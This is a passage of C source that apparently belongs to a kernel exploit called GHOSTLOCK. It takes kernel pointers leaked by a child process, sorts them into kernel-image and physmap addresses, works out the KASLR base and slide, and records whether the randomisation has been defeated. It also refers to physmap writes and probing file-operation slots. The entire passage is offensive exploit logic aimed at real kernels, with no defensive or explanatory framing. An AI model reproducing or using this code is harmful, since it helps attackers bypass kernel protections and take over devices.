      pr_warning("slide attempt %d failed n=%zd status=%d exit=%d\n",
                 attempt, n, status, ex);
      continue;
    }
    /* Restore leak metadata in parent from pipe (strict text-KIMAGE + hybrid). */
    boot_id_leaked_ptr = payload[0];
    uint64_t leaked_hi = payload[1];
    slide_bootid_hi_capture = leaked_hi;
    boot_id_leak_is_physmap =
        boot_id_leaked_ptr &&
        ((boot_id_leaked_ptr & 0xfffffff000000000ULL) == 0xffffff8000000000ULL);
    {
      uint64_t L = boot_id_leaked_ptr;
      int high_ok = L && ((L >> 48) == 0xffff) && !boot_id_leak_is_physmap;
      uint64_t b_n = L - SLIDE_NFULNL_LOGGER_OFF;
      uint64_t b_l = L - SLIDE_LOGGERS_0_1_OFF;
      int n_ok = high_ok && ((b_n & 0x1fffffULL) == 0) &&
                 ((b_n & 0xfffffff000000000ULL) != 0xffffff8000000000ULL);
      int l_ok = high_ok && ((b_l & 0x1fffffULL) == 0) &&
                 ((b_l & 0xfffffff000000000ULL) != 0xffffff8000000000ULL);
      /* hi residual ignored — a.so accepts lo-only KIMAGE (2026-07-24). */
      boot_id_leak_is_hybrid = 0;
      boot_id_leak_is_kimage = n_ok || l_ok;
      if (boot_id_leak_is_kimage) {
        uint64_t base = n_ok ? b_n : b_l;
        unsigned tag = (unsigned)((base >> 40) & 0xffu);
        if (tag == 0xeeu || tag == 0xefu) {
          pr_warning("BOOT_ID parent tag=0x%02x reject base=%016llx\n",
                     tag, (unsigned long long)base);
          boot_id_leak_is_kimage = 0;
        }
      }
      (void)leaked_hi;
    }
    if (boot_id_leaked_ptr) {
      pr_info("BOOT_ID_LEAK parent ptr=%016llx is_kimage=%d is_physmap=%d\n",
                 (unsigned long long)boot_id_leaked_ptr, boot_id_leak_is_kimage,
                 boot_id_leak_is_physmap);
    }

    /*
     * Child returns either:
     *  - real KIMAGE base (0xffffffc0..., slide may be 0 if unlucky)
     *  - KIMAGE_TEXT_BASE after P0 physmap write confirm (NOT a text leak)
     *
     * a.so treats slide path as success when boot_id yields a kernel-looking
     * ptr; but P0 parent echo has ZERO KIMAGE entropy. Only mark kaslr_done
     * when the returned base is a real KIMAGE VA AND we have evidence it
     * came from a KIMAGE-style leak (not the P0-confirm shortcut).
     *
     * P0 confirm returns KIMAGE_TEXT_BASE with slide=0 — do NOT set
     * kaslr_done (would lie to text_addr / FOPS).
     * Force with GHOSTLOCK_ASSUME_SLIDE0=1 only for explicit experiments.
     */
    kaslr_base = stext;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    {
      char *force = getenv("GHOSTLOCK_ASSUME_SLIDE0");
      int assume0 = force && force[0] == '1';
      int is_kimage =
          ((stext >> 48) == 0xffff) &&
          ((stext & 0xfffffff000000000ULL) != 0xffffff8000000000ULL);
      /* Real leak: non-zero slide, or force, or base not the static default
       * alone without dual-check — require slide!=0 OR assume0.
       * P0 shortcut returns KIMAGE_TEXT_BASE (static) with slide=0 → reject. */
      int is_static_default = (stext == (uint64_t)KIMAGE_TEXT_BASE);
      if (is_kimage && !is_static_default && (kaslr_slide != 0 || assume0)) {
        kaslr_done = 1;
        pr_info("slide-kaslr-ok pid=%d base=%016llx slide=%016llx "
                   "(source=slide assume0=%d)\n",
                   getpid(), (unsigned long long)kaslr_base,
                   (unsigned long long)kaslr_slide, assume0);
      } else {
        kaslr_done = 0;
        pr_warning("slide stages/write ok but NO KIMAGE entropy "
                   "(base=%016llx slide=%016llx); kaslr_done=0 "
                   "(need perf or real text ptr)\n",
                   (unsigned long long)kaslr_base,
                   (unsigned long long)kaslr_slide);
        /* Log p0 fops slots while process still alive (parent after child). */
        kimage_chain_probe();
      }
    }
    return 1;
  }

  return 0;
}
